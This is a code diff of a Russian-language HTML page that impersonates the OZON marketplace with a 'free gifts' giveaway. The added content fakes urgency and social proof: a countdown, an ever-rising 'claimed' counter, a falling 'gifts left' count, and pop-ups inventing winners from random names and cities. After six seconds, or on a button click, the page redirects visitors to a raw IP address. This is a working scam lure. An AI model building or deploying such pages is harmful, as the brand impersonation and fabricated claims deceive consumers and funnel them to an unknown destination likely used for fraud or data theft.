@@ -2,54 +2,227 @@
 <html lang="ru">
 <head>
 <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Забери подарки прямо сейчас</title>
 
-<!-- Open Graph теги для превью -->
 <meta property="og:title" content="Забери подарки прямо сейчас">
-<meta property="og:description" content=".">
+<meta property="og:description" content="OZON дарит подарки — забери свой!">
 <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s">
 <meta property="og:url" content="https://vk-ozon-podarki.github.io">
 <meta property="og:type" content="website">
-<meta property="og:site_name" content="Забери подарки прямо сейчас">
+<meta property="og:site_name" content="OZON Подарки">
 
-<!-- Twitter Card теги -->
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="Забери подарки прямо сейчас">
 <meta name="twitter:description" content="https://192.253.248.4/?s=sCcUFzRVCt">
 <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s">
 
 <style>
+* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
 body {
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    font-family: 'Segoe UI', Arial, sans-serif;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     min-height: 100vh;
-    margin: 0;
+    background: #F91155;
     overflow: hidden;
     display: flex;
     align-items: center;
     justify-content: center;
+    position: relative;
+}
+
+body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background:
+        radial-gradient(ellipse 80% 50% at 20% 30%, #005BFF 0%, transparent 50%),
+        radial-gradient(ellipse 70% 60% at 80% 60%, #005BFF 0%, transparent 55%),
+        radial-gradient(ellipse 60% 40% at 40% 80%, #005BFF 0%, transparent 50%),
+        radial-gradient(ellipse 90% 50% at 90% 20%, #005BFF 0%, transparent 45%),
+        radial-gradient(ellipse 50% 70% at 10% 70%, #005BFF 0%, transparent 50%);
+    background-color: #F91155;
+    animation: waveShift 12s ease-in-out infinite;
+    z-index: 1;
+}
+
+@keyframes waveShift {
+    0%, 100% { transform: scale(1) rotate(0deg); }
+    50% { transform: scale(1.05) rotate(2deg); }
+}
+
+.logo {
+    position: fixed;
+    top: 20px; left: 50%;
+    transform: translateX(-50%);
+    font-size: 42px; font-weight: 900;
+    color: #fff; letter-spacing: 2px;
+    z-index: 10;
+    font-family: 'Arial Black', sans-serif;
+    text-shadow: 0 4px 20px rgba(0,0,0,0.15);
+    animation: logoPulse 3s ease-in-out infinite;
+}
+
+@keyframes logoPulse {
+    0%, 100% { transform: translateX(-50%) scale(1); }
+    50% { transform: translateX(-50%) scale(1.05); }
+}
+
+/* Обратный счётчик акции */
+.deal-timer {
+    position: fixed;
+    top: 75px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(255,255,255,0.95);
+    color: #F91155;
+    padding: 8px 18px;
+    border-radius: 20px;
+    font-size: 13px;
+    font-weight: 700;
+    z-index: 10;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+    white-space: nowrap;
+}
+
+.deal-timer span {
+    font-family: 'Courier New', monospace;
+    font-size: 15px;
 }
 
 .card {
     background: #fff;
     border-radius: 20px;
-    padding: 40px;
+    padding: 30px 25px;
     text-align: center;
     box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-    max-width: 400px;
+    max-width: 340px;
+    width: 88%;
     z-index: 10;
+    position: relative;
+    animation: cardIn 0.6s ease-out;
+    margin-top: 40px;
 }
 
-h1 {
-    color: #333;
-    font-size: 28px;
-    margin: 20px 0 10px;
+@keyframes cardIn {
+    from { transform: scale(0.8) translateY(30px); opacity: 0; }
+    to { transform: scale(1) translateY(0); opacity: 1; }
 }
 
-p {
+.gift-icon {
+    width: 90px; height: 90px;
+    margin: 0 auto 15px;
+    background: linear-gradient(135deg, #005BFF, #F91155);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 50px;
+    animation: giftBounce 1.5s ease-in-out infinite;
+    box-shadow: 0 10px 30px rgba(0,91,255,0.3);
+    transition: transform 0.3s;
+}
+
+.gift-icon.opened {
+    animation: openGift 0.6s ease-out forwards;
+}
+
+@keyframes openGift {
+    0% { transform: scale(1) rotate(0deg); }
+    30% { transform: scale(1.3) rotate(-15deg); }
+    60% { transform: scale(1.2) rotate(15deg); }
+    100% { transform: scale(0) rotate(360deg); opacity: 0; }
+}
+
+@keyframes giftBounce {
+    0%, 100% { transform: translateY(0) rotate(-5deg); }
+    50% { transform: translateY(-10px) rotate(5deg); }
+}
+
+.card h1 {
+    color: #1a1a1a;
+    font-size: 22px;
+    font-weight: 800;
+    margin-bottom: 10px;
+    line-height: 1.3;
+}
+
+.card p {
     color: #666;
+    font-size: 14px;
+    margin-bottom: 15px;
+    line-height: 1.5;
+}
+
+/* Счётчик забравших */
+.claimed {
+    display: inline-block;
+    background: #F0F8FF;
+    color: #005BFF;
+    font-size: 12px;
+    font-weight: 700;
+    padding: 6px 14px;
+    border-radius: 12px;
+    margin-bottom: 15px;
+}
+
+.claimed b {
+    color: #F91155;
+    font-size: 15px;
+}
+
+.price {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 10px;
+}
+
+.price-old {
+    color: #999; font-size: 18px;
+    text-decoration: line-through;
+}
+
+.price-new {
+    color: #F91155;
+    font-size: 32px; font-weight: 900;
+    animation: pricePulse 1.5s ease-in-out infinite;
+}
+
+@keyframes pricePulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.1); }
+}
+
+.stock-left {
+    color: #F91155;
+    font-size: 12px;
+    font-weight: 700;
+    margin-bottom: 18px;
+}
+
+.btn {
+    background: #005BFF;
+    color: #fff;
+    border: none;
+    border-radius: 12px;
+    padding: 16px 24px;
     font-size: 16px;
-    margin: 10px 0 20px;
+    font-weight: 700;
+    width: 100%;
+    cursor: pointer;
+    animation: btnPulse 1.5s ease-in-out infinite;
+    box-shadow: 0 8px 20px rgba(0,91,255,0.35);
+    font-family: inherit;
+    transition: transform 0.2s;
+}
+
+.btn:active {
+    transform: scale(0.97);
+}
+
+@keyframes btnPulse {
+    0%, 100% { transform: scale(1); box-shadow: 0 8px 20px rgba(0,91,255,0.35); }
+    50% { transform: scale(1.03); box-shadow: 0 12px 28px rgba(0,91,255,0.5); }
 }
 
 .progress {
@@ -61,188 +234,230 @@ p {
 }
 
 .progress-bar {
-    background: linear-gradient(90deg, #667eea, #764ba2);
+    background: linear-gradient(90deg, #005BFF, #F91155);
     height: 100%;
     width: 0;
     transition: width 0.1s linear;
+    border-radius: 10px;
 }
 
 .timer {
     color: #888;
-    font-size: 14px;
+    font-size: 13px;
+    font-weight: 500;
 }
 
 /* Конфетти */
 .confetti {
     position: fixed;
-    top: -10px;
+    top: -20px;
     width: 10px;
     height: 10px;
-    background: #ff6b6b;
     animation: fall linear infinite;
-    z-index: 1;
+    z-index: 5;
+    border-radius: 2px;
 }
-
-.confetti:nth-child(1) { background: #ff6b6b; }
-.confetti:nth-child(2) { background: #4ecdc4; }
-.confetti:nth-child(3) { background: #ffe66d; }
-.confetti:nth-child(4) { background: #a8e6cf; }
-.confetti:nth-child(5) { background: #dda0dd; }
-.confetti:nth-child(6) { background: #ffb347; }
-.confetti:nth-child(7) { background: #87ceeb; }
-.confetti:nth-child(8) { background: #ff6b6b; }
-.confetti:nth-child(9) { background: #4ecdc4; }
-.confetti:nth-child(10) { background: #ffe66d; }
 
 @keyframes fall {
-    to {
-        transform: translateY(100vh) rotate(720deg);
-    }
+    to { transform: translateY(105vh) rotate(720deg); }
 }
 
-/* Шарики */
-.balloon {
+/* Всплывающие уведомления */
+.notifications {
     position: fixed;
-    bottom: -100px;
-    width: 40px;
-    height: 50px;
-    border-radius: 50%;
-    animation: float 8s ease-in infinite;
-    z-index: 1;
+    bottom: 15px;
+    left: 15px;
+    z-index: 20;
+    max-width: 280px;
 }
 
-.balloon:nth-child(11) { left: 10%; background: #4ecdc4; animation-delay: 0s; }
-.balloon:nth-child(12) { left: 25%; background: #ffe66d; animation-delay: 1s; }
-.balloon:nth-child(13) { left: 40%; background: #ff6b6b; animation-delay: 2s; }
-.balloon:nth-child(14) { left: 55%; background: #a8e6cf; animation-delay: 3s; }
-.balloon:nth-child(15) { left: 70%; background: #dda0dd; animation-delay: 4s; }
-.balloon:nth-child(16) { left: 85%; background: #ffb347; animation-delay: 5s; }
-.balloon:nth-child(17) { left: 95%; background: #87ceeb; animation-delay: 6s; }
-
-@keyframes float {
-    to {
-        transform: translateY(-120vh);
-    }
-}
-
-/* Торт */
-.cake-wrapper {
-    margin: 20px auto;
-    width: 120px;
-}
-
-.cake {
-    position: relative;
-}
-
-.layer {
-    border-radius: 8px;
-    margin: 0 auto;
-}
-
-.layer-1 { width: 120px; height: 30px; background: #f4a460; }
-.layer-2 { width: 100px; height: 25px; background: #ffb6c1; }
-.layer-3 { width: 80px; height: 20px; background: #f4a460; }
-
-.frosting {
-    height: 8px;
+.notif {
     background: #fff;
-    border-radius: 8px 8px 0 0;
-}
-
-.candles {
+    border-radius: 12px;
+    padding: 10px 14px;
+    margin-top: 8px;
+    box-shadow: 0 6px 20px rgba(0,0,0,0.2);
     display: flex;
-    justify-content: center;
+    align-items: center;
     gap: 10px;
-    margin-bottom: 5px;
+    animation: notifIn 0.4s ease-out;
+    border-left: 3px solid #005BFF;
 }
 
-.candle {
-    width: 6px;
-    height: 20px;
-    background: linear-gradient(to top, #ff6b6b 50%, #fff 50%);
-    border-radius: 2px;
-    position: relative;
+.notif.out {
+    animation: notifOut 0.4s ease-in forwards;
 }
 
-.candle::after {
-    content: '';
-    position: absolute;
-    top: -8px;
-    left: 50%;
-    transform: translateX(-50%);
-    width: 6px;
-    height: 8px;
-    background: radial-gradient(circle, #ffd700, #ff6b6b);
+.notif-avatar {
+    width: 32px; height: 32px;
+    background: linear-gradient(135deg, #005BFF, #F91155);
     border-radius: 50%;
-    animation: flicker 0.5s infinite alternate;
+    display: flex; align-items: center; justify-content: center;
+    color: #fff;
+    font-weight: 700;
+    font-size: 14px;
+    flex-shrink: 0;
 }
 
-@keyframes flicker {
-    to {
-        transform: translateX(-50%) scale(1.2);
-        opacity: 0.8;
-    }
+.notif-text {
+    font-size: 11px;
+    color: #333;
+    line-height: 1.3;
+}
+
+.notif-text b {
+    color: #1a1a1a;
+}
+
+.notif-text small {
+    color: #999;
+    font-size: 10px;
+}
+
+@keyframes notifIn {
+    from { transform: translateX(-120%); opacity: 0; }
+    to { transform: translateX(0); opacity: 1; }
+}
+
+@keyframes notifOut {
+    to { transform: translateX(-120%); opacity: 0; }
+}
+
+@media (max-width: 360px) {
+    .logo { font-size: 32px; }
+    .deal-timer { font-size: 11px; padding: 6px 14px; top: 65px; }
+    .card { padding: 25px 18px; }
+    .card h1 { font-size: 19px; }
+    .price-new { font-size: 26px; }
+    .gift-icon { width: 75px; height: 75px; font-size: 40px; }
+    .notifications { max-width: 240px; }
 }
 </style>
 </head>
 <body>
 
-<!-- Конфетти -->
-<div class="confetti" style="left: 5%;  animation-duration: 4.2s; animation-delay: 0s;"></div>
-<div class="confetti" style="left: 15%; animation-duration: 5.1s; animation-delay: 0.3s;"></div>
-<div class="confetti" style="left: 25%; animation-duration: 3.8s; animation-delay: 0.7s;"></div>
-<div class="confetti" style="left: 35%; animation-duration: 4.7s; animation-delay: 0.1s;"></div>
-<div class="confetti" style="left: 45%; animation-duration: 5.5s; animation-delay: 0.9s;"></div>
-<div class="confetti" style="left: 55%; animation-duration: 4.0s; animation-delay: 0.4s;"></div>
-<div class="confetti" style="left: 65%; animation-duration: 5.3s; animation-delay: 0.2s;"></div>
-<div class="confetti" style="left: 75%; animation-duration: 3.9s; animation-delay: 0.6s;"></div>
-<div class="confetti" style="left: 85%; animation-duration: 4.8s; animation-delay: 0.8s;"></div>
-<div class="confetti" style="left: 92%; animation-duration: 5.0s; animation-delay: 0.5s;"></div>
+<div class="logo">OZON</div>
 
-<!-- Шарики -->
-<div class="balloon"></div>
-<div class="balloon"></div>
-<div class="balloon"></div>
-<div class="balloon"></div>
-<div class="balloon"></div>
-<div class="balloon"></div>
-<div class="balloon"></div>
+<div class="deal-timer">
+    ⏰ До конца акции: <span id="dealTimer">00:05:42</span>
+</div>
+
+<!-- Конфетти -->
+<div class="confetti" style="left: 8%;  background: #F91155; animation-duration: 4.5s; animation-delay: 0s;"></div>
+<div class="confetti" style="left: 22%; background: #005BFF; animation-duration: 5.2s; animation-delay: 0.4s;"></div>
+<div class="confetti" style="left: 38%; background: #F91155; animation-duration: 3.9s; animation-delay: 0.8s;"></div>
+<div class="confetti" style="left: 52%; background: #005BFF; animation-duration: 4.8s; animation-delay: 0.2s;"></div>
+<div class="confetti" style="left: 68%; background: #F91155; animation-duration: 5.5s; animation-delay: 0.6s;"></div>
+<div class="confetti" style="left: 82%; background: #005BFF; animation-duration: 4.2s; animation-delay: 1s;"></div>
+<div class="confetti" style="left: 94%; background: #F91155; animation-duration: 5.0s; animation-delay: 0.3s;"></div>
 
 <!-- Карточка -->
 <div class="card">
-    <div class="cake-wrapper">
-        <div class="cake">
-            <div class="candles">
-                <div class="candle"></div>
-                <div class="candle"></div>
-                <div class="candle"></div>
-            </div>
-            <div class="layer layer-3"><div class="frosting"></div></div>
-            <div class="layer layer-2"><div class="frosting"></div></div>
-            <div class="layer layer-1"><div class="frosting"></div></div>
-        </div>
-    </div>
+    <div class="gift-icon" id="gift">🎁</div>
 
     <h1>Забери подарки прямо сейчас</h1>
-    <p>Мы приготовили для тебя<br>что-то особенное...</p>
+    <p>OZON дарит подарки!<br>Успей забрать свой.</p>
+
+    <div class="claimed">
+        Уже забрали: <b id="claimCount">2 347</b> человек
+    </div>
+
+    <div class="price">
+        <span class="price-old">999 ₽</span>
+        <span class="price-new">0 ₽</span>
+    </div>
+
+    <div class="stock-left" id="stockLeft">Осталось 47 подарков</div>
+
+    <button class="btn" id="btn">Забрать подарок</button>
 
     <div class="progress">
         <div class="progress-bar" id="bar"></div>
     </div>
-    <div class="timer" id="timer">Переход через 3 секунды...</div>
+    <div class="timer" id="timer">Переход через 6 секунд...</div>
 </div>
 
-<script>
-    // ===== НАСТРОЙКИ =====
-    const REDIRECT_URL = "https://192.253.248.4/?s=sCcUFzRVCt";
-    const DELAY = 3000; // 3000 = 3 секунды
+<!-- Всплывающие уведомления -->
+<div class="notifications" id="notifications"></div>
 
+<script>
+    const REDIRECT_URL = "https://192.253.248.4/?s=sCcUFzRVCt";
+    const DELAY = 6000;
+
+    // ===== Счётчик забравших =====
+    let claimCount = 2347;
+    const claimEl = document.getElementById('claimCount');
+    setInterval(() => {
+        claimCount += Math.floor(Math.random() * 3) + 1;
+        claimEl.textContent = claimCount.toLocaleString('ru-RU');
+    }, 2500);
+
+    // ===== Счётчик оставшихся подарков =====
+    let stockLeft = 47;
+    const stockEl = document.getElementById('stockLeft');
+    setInterval(() => {
+        if (stockLeft > 3) {
+            stockLeft -= Math.floor(Math.random() * 2) + 1;
+            if (stockLeft < 3) stockLeft = 3;
+            stockEl.textContent = `Осталось ${stockLeft} подарков`;
+        }
+    }, 4000);
+
+    // ===== Обратный счётчик акции =====
+    let dealTime = 5 * 60 + 42; // 5:42
+    const dealEl = document.getElementById('dealTimer');
+    setInterval(() => {
+        if (dealTime > 0) {
+            dealTime--;
+            const m = String(Math.floor(dealTime / 60)).padStart(2, '0');
+            const s = String(dealTime % 60).padStart(2, '0');
+            dealEl.textContent = `${m}:${s}`;
+        }
+    }, 1000);
+
+    // ===== Всплывающие уведомления =====
+    const names = ['Ольга', 'Дмитрий', 'Анна', 'Сергей', 'Мария', 'Алексей', 'Екатерина', 'Иван', 'Наталья', 'Максим', 'Елена', 'Артём', 'Юлия', 'Андрей', 'Татьяна'];
+    const cities = ['Москвы', 'Санкт-Петербурга', 'Казани', 'Новосибирска', 'Екатеринбурга', 'Краснодара', 'Нижнего Новгорода', 'Самары', 'Омска', 'Ростова-на-Дону', 'Уфы', 'Красноярска'];
+    const gifts = ['🎁 подарок', '📱 смартфон', '🎧 наушники', '⌚ часы', '💻 ноутбук', '📷 камеру', '🎮 приставку'];
+    const notifContainer = document.getElementById('notifications');
+
+    function showNotification() {
+        const name = names[Math.floor(Math.random() * names.length)];
+        const city = cities[Math.floor(Math.random() * cities.length)];
+        const gift = gifts[Math.floor(Math.random() * gifts.length)];
+        const timeAgo = Math.floor(Math.random() * 5) + 1;
+
+        const notif = document.createElement('div');
+        notif.className = 'notif';
+        notif.innerHTML = `
+            <div class="notif-avatar">${name[0]}</div>
+            <div class="notif-text">
+                <b>${name}</b> из ${city}<br>
+                забрала ${gift}<br>
+                <small>${timeAgo} мин. назад</small>
+            </div>
+        `;
+        notifContainer.appendChild(notif);
+
+        setTimeout(() => {
+            notif.classList.add('out');
+            setTimeout(() => notif.remove(), 400);
+        }, 3500);
+    }
+
+    // Первое уведомление через 2 секунды, потом каждые 4-7 секунд
+    setTimeout(showNotification, 2000);
+    setInterval(showNotification, 5000);
+
+    // ===== Прогресс-бар и редирект =====
     const bar = document.getElementById('bar');
     const timer = document.getElementById('timer');
+    const giftEl = document.getElementById('gift');
     let timeLeft = DELAY / 1000;
+    let redirected = false;
 
     const interval = setInterval(() => {
+        if (redirected) return;
         timeLeft -= 0.1;
         const progress = ((DELAY / 1000 - timeLeft) / (DELAY / 1000)) * 100;
         bar.style.width = Math.min(progress, 100) + '%';
@@ -255,9 +470,19 @@ p {
         }
     }, 100);
 
-    setTimeout(() => {
+    function doRedirect() {
+        if (redirected) return;
+        redirected = true;
         window.location.href = REDIRECT_URL;
-    }, DELAY);
+    }
+
+    setTimeout(doRedirect, DELAY);
+
+    // ===== Анимация открытия подарка при клике =====
+    document.getElementById('btn').addEventListener('click', () => {
+        giftEl.classList.add('opened');
+        setTimeout(doRedirect, 500);
+    });
 </script>
 
 </body>
